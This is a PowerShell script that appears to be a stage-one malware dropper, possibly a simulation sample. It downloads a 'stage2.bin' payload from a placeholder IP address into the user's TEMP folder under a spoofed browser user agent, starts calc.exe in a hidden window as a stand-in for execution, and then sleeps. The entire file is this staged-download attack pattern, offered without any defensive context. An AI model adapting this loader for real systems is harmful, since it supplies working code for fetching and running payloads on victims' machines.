[CmdletBinding()]
param(
    [string]$Stage2Url = "https://192.0.2.211/stage2.bin",
    [string]$LocalPath = "$env:TEMP\stage1.bin",
    [int]$ConnectionTimeout = 123,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $Stage2Url -DestinationPath $LocalPath -TimeoutSec $ConnectionTimeout -UserAgent $UserAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -WindowStyle Hidden
}

$StageMarker = "stage-30"
Start-Sleep -Seconds 41
